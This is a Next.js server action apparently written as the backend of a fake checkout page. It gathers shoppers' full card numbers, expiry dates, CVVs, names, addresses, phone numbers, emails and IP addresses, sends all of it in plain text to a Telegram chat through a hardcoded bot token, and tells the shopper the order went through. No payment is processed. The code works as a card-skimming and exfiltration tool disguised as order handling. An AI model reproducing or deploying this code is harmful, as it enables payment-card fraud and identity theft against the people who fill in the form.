"use server"

import { revalidatePath } from "next/cache"
import { headers } from "next/headers"

const TELEGRAM_BOT_TOKEN = "7640274762:AAHBKbMbwxqQf1J8ucv_85KvTkJgGg0nC9g"
const TELEGRAM_CHAT_ID = "7049681503"

export async function sendToTelegram(formData: FormData) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Telegram bot token or chat ID is missing")
    return { success: false, message: "Configuration error" }
  }

  const headersList = headers()
  const ip = headersList.get("x-forwarded-for") || "Unknown"
  const userAgent = headersList.get("user-agent") || "Unknown"

  const message = `
🛍️ New Order Received!

Product Information:
- Quantity: ${formData.get("quantity")}
- Total Cost: $${formData.get("totalCost")}

Customer Information:
- Email: ${formData.get("email")}
- Phone: ${formData.get("countryCode")} ${formData.get("phone")}

Card Information:
- Card Number: ${formData.get("cardNumber")}
- Expiry: ${formData.get("expiryMonth")}/${formData.get("expiryYear")}
- CVV: ${formData.get("cvv")}
- Cardholder Name: ${formData.get("cardholderName")}

Billing Information:
- First Name: ${formData.get("billingFirstName")}
- Last Name: ${formData.get("billingLastName")}
- Country: ${formData.get("country")}
- Address: ${formData.get("billingAddress")}
- Apartment: ${formData.get("billingApartment") || "N/A"}
- City: ${formData.get("billingCity")}
- State: ${formData.get("billingState")}
- ZIP: ${formData.get("billingZip")}

Shipping Information:
- Same as Billing: ${formData.get("sameAddress") ? "Yes" : "No"}
- Different Shipping Address: ${formData.get("differentShipping") ? "Yes" : "No"}
${
  formData.get("differentShipping")
    ? `
- First Name: ${formData.get("shippingFirstName")}
- Last Name: ${formData.get("shippingLastName")}
- Shipping Country: ${formData.get("shippingCountry")}
- Shipping Address: ${formData.get("shippingAddress")}
- Shipping Apartment: ${formData.get("shippingApartment") || "N/A"}
- Shipping City: ${formData.get("shippingCity")}
- Shipping State: ${formData.get("shippingState")}
- Shipping ZIP: ${formData.get("shippingZip")}
`
    : ""
}

User Information:
- IP Address: ${ip}
- User Agent: ${userAgent}
`.trim()

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    })

    if (!response.ok) {
      throw new Error("Failed to send message to Telegram")
    }

    revalidatePath("/")
    return { success: true, message: "Order submitted successfully" }
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    return { success: false, message: "Failed to submit order" }
  }
}

